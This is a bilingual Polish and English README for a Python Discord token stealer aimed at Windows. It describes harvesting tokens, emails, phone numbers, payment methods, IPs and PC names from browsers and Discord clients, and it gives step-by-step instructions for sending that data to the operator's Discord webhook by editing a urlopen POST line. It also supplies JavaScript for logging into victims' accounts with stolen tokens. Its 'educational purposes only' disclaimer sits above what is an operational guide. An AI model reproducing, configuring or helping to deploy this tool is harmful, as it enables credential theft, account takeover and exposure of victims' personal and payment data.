

## 🇵🇱 POLSKA WERSJA

**UWAGA: Ten skrypt jest przeznaczony wyłącznie do celów edukacyjnych i testowania bezpieczeństwa. Używaj go tylko na własnych systemach lub za zgodą właściciela.**

### Opis

Ten skrypt automatycznie wyszukuje i wykrada tokeny Discord z różnych przeglądarek i aplikacji Discord zainstalowanych na systemie Windows. Zbiera szczegółowe informacje o użytkowniku, serwerach, subskrypcjach Nitro i metodach płatności.

### Funkcje

- 🔍 Automatyczne wyszukiwanie tokenów Discord z:
  - Discord (Desktop)
  - Discord Canary
  - Discord PTB
  - Lightcord
  - Opery i Opera GX
  - Chrome i Chromium-based browsers
  - Edge, Brave, Yandex i inne

- 📊 Zbierane informacje:
  - Token Discord
  - Dane użytkownika (ID, email, telefon)
  - Liczba serwerów i uprawnienia administratora
  - Informacje o Discord Nitro
  - Dostępne boosty serwerów
  - Metody płatności
  - Informacje o systemie (IP, nazwa użytkownika, nazwa PC)

### Wymagania

- Windows (skrypt sprawdza czy działa na Windows)
- Python 3.6+
- Dostęp do internetu

### Instalacja i Konfiguracja

#### 1. Pobierz i zainstaluj Python
Pobierz Python z [python.org](https://www.python.org/downloads/) i zainstaluj go.

#### 2. Skonfiguruj Webhook Discord

1. Otwórz Discord i przejdź do serwera, gdzie chcesz otrzymywać tokeny
2. Przejdź do ustawień kanału → Integracje → Webhooks
3. Kliknij "Utwórz webhook"
4. Skopiuj URL webhook

#### 3. Edytuj kod

Otwórz plik `main.py` i znajdź linię 205:

```python
urllib.request.urlopen(urllib.request.Request('webhooks', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
```

Zastąp `'webhooks'` swoim URL webhook:

```python
urllib.request.urlopen(urllib.request.Request('TWÓJ_WEBHOOK_URL_TUTAJ', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
```

#### 4. Uruchom skrypt

```bash
python main.py
```

### Przykład konfiguracji

```python
# Linia 205 w main.py - PRZED:
urllib.request.urlopen(urllib.request.Request('webhooks', ...))

# Linia 205 w main.py - PO:
urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz', ...))
```

### Automatyczna instalacja zależności

Skrypt automatycznie zainstaluje wymagane biblioteki:
- `pypiwin32` (dla `win32crypt`)
- `pycryptodome` (dla `Crypto.Cipher`)

### Jak używać zdobytego tokenu do automatycznego logowania

Po zdobyciu tokenu Discord możesz użyć go do automatycznego logowania w przeglądarce:

#### Metoda 1: Użycie skryptu logger.js

1. **Otwórz przeglądarkę** i przejdź na `https://discord.com/login`
2. **Otwórz DevTools** (F12 lub Ctrl+Shift+I)
3. **Przejdź do zakładki Console**
4. **Edytuj plik `logger.js`**:
   ```javascript
   let token = "TUTAJ_WKLEJ_SWOJ_TOKEN"; // Zastąp swoim tokenem
   
   function login(token) {
       setInterval(() => {
         document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
       }, 50);
       setTimeout(() => {
         location.reload();
       }, 2500);
     }
   
   login(token);
   ```
5. **Skopiuj i wklej** cały kod do konsoli
6. **Naciśnij Enter** - strona się przeładuje i zostaniesz automatycznie zalogowany

#### Metoda 2: Bezpośrednie wklejenie

1. **Otwórz Discord** w przeglądarce (`https://discord.com/login`)
2. **Otwórz DevTools** (F12)
3. **Wklej ten kod** do konsoli (zastąp `YOUR_TOKEN_HERE` swoim tokenem):
   ```javascript
   let token = "YOUR_TOKEN_HERE";
   setInterval(() => {
     document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
   }, 50);
   setTimeout(() => {
     location.reload();
   }, 2500);
   ```

### Format danych wysyłanych do webhook

Dane są wysyłane jako embed Discord z następującymi informacjami:

```yaml
User ID: [ID użytkownika]
Email: [email użytkownika]
Phone Number: [numer telefonu]
Guilds: [liczba serwerów]
Admin Permissions: [lista serwerów z uprawnieniami admina]

MFA Enabled: [czy 2FA włączone]
Flags: [flagi użytkownika]
Locale: [język]
Verified: [czy zweryfikowany]

Nitro Informations:
Has Nitro: [czy ma Nitro]
Expiration Date: [data wygaśnięcia]
Boosts Available: [dostępne boosty]

Payment Methods:
Amount: [liczba metod płatności]
Valid Methods: [ważne metody]
Type: [typ metod płatności]

IP: [IP użytkownika]
Username: [nazwa użytkownika systemu]
PC Name: [nazwa komputera]
Token Location: [lokalizacja tokenu]
```

### Rozwiązywanie problemów

#### Błąd "Permission denied"
- Uruchom jako administrator

#### Brak tokenów
- Sprawdź czy Discord jest zainstalowany
- Upewnij się, że użytkownik był zalogowany w Discord

#### Webhook nie działa
- Sprawdź URL webhook
- Upewnij się, że webhook jest aktywny
- Sprawdź połączenie internetowe

### Ostrzeżenie prawne

**WAŻNE:** Ten skrypt jest przeznaczony wyłącznie do celów edukacyjnych i testowania bezpieczeństwa. Używanie go do nielegalnych celów jest zabronione. Autor nie ponosi odpowiedzialności za niewłaściwe użycie tego narzędzia.

### Licencja

Ten projekt jest udostępniony na licencji MIT. Zobacz plik LICENSE dla szczegółów.

### Autor

Made by Wisnia
GitHub: https://github.com/MarauTech

---

## 🇺🇸 ENGLISH VERSION

**WARNING: This script is intended for educational purposes and security testing only. Use it only on your own systems or with the owner's consent.**

### Description

This script automatically searches for and extracts Discord tokens from various browsers and Discord applications installed on Windows systems. It collects detailed information about users, servers, Nitro subscriptions, and payment methods.

### Features

- 🔍 Automatic Discord token search from:
  - Discord (Desktop)
  - Discord Canary
  - Discord PTB
  - Lightcord
  - Opera and Opera GX
  - Chrome and Chromium-based browsers
  - Edge, Brave, Yandex and others

- 📊 Collected information:
  - Discord Token
  - User data (ID, email, phone)
  - Server count and administrator permissions
  - Discord Nitro information
  - Available server boosts
  - Payment methods
  - System information (IP, username, PC name)

### Requirements

- Windows (script checks if running on Windows)
- Python 3.6+
- Internet access

### Installation and Configuration

#### 1. Download and install Python
Download Python from [python.org](https://www.python.org/downloads/) and install it.

#### 2. Configure Discord Webhook

1. Open Discord and go to the server where you want to receive tokens
2. Go to channel settings → Integrations → Webhooks
3. Click "Create webhook"
4. Copy the webhook URL

#### 3. Edit the code

Open the `main.py` file and find line 205:

```python
urllib.request.urlopen(urllib.request.Request('webhooks', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
```

Replace `'webhooks'` with your webhook URL:

```python
urllib.request.urlopen(urllib.request.Request('YOUR_WEBHOOK_URL_HERE', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
```

#### 4. Run the script

```bash
python main.py
```

### Configuration Example

```python
# Line 205 in main.py - BEFORE:
urllib.request.urlopen(urllib.request.Request('webhooks', ...))

# Line 205 in main.py - AFTER:
urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz', ...))
```

### Automatic dependency installation

The script automatically installs required libraries:
- `pypiwin32` (for `win32crypt`)
- `pycryptodome` (for `Crypto.Cipher`)

### How to use the stolen token for automatic login

After obtaining a Discord token, you can use it for automatic login in the browser:

#### Method 1: Using logger.js script

1. **Open your browser** and go to `https://discord.com/login`
2. **Open DevTools** (F12 or Ctrl+Shift+I)
3. **Go to Console tab**
4. **Edit the `logger.js` file**:
   ```javascript
   let token = "PASTE_YOUR_TOKEN_HERE"; // Replace with your token
   
   function login(token) {
       setInterval(() => {
         document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
       }, 50);
       setTimeout(() => {
         location.reload();
       }, 2500);
     }
   
   login(token);
   ```
5. **Copy and paste** the entire code into the console
6. **Press Enter** - the page will reload and you'll be automatically logged in

#### Method 2: Direct paste

1. **Open Discord** in browser (`https://discord.com/login`)
2. **Open DevTools** (F12)
3. **Paste this code** into console (replace `YOUR_TOKEN_HERE` with your token):
   ```javascript
   let token = "YOUR_TOKEN_HERE";
   setInterval(() => {
     document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
   }, 50);
   setTimeout(() => {
     location.reload();
   }, 2500);
   ```

### Webhook data format

Data is sent as a Discord embed with the following information:

```yaml
User ID: [user ID]
Email: [user email]
Phone Number: [phone number]
Guilds: [server count]
Admin Permissions: [list of servers with admin permissions]

MFA Enabled: [2FA status]
Flags: [user flags]
Locale: [language]
Verified: [verification status]

Nitro Informations:
Has Nitro: [Nitro status]
Expiration Date: [expiration date]
Boosts Available: [available boosts]

Payment Methods:
Amount: [payment methods count]
Valid Methods: [valid methods]
Type: [payment method types]

IP: [user IP]
Username: [system username]
PC Name: [computer name]
Token Location: [token location]
```

### Troubleshooting

#### "Permission denied" error
- Run as administrator

#### No tokens found
- Check if Discord is installed
- Make sure user was logged into Discord

#### Webhook not working
- Check webhook URL
- Make sure webhook is active
- Check internet connection

### Legal Warning

**IMPORTANT:** This script is intended for educational purposes and security testing only. Using it for illegal purposes is prohibited. The author is not responsible for misuse of this tool.

### License

This project is released under the MIT license. See LICENSE file for details.

### Author

Made by Wisnia
GitHub: https://github.com/MarauTech

---

**Pamiętaj:** Zawsze przestrzegaj lokalnych przepisów i używaj tego narzędzia odpowiedzialnie!

**Remember:** Always comply with local laws and use this tool responsibly!
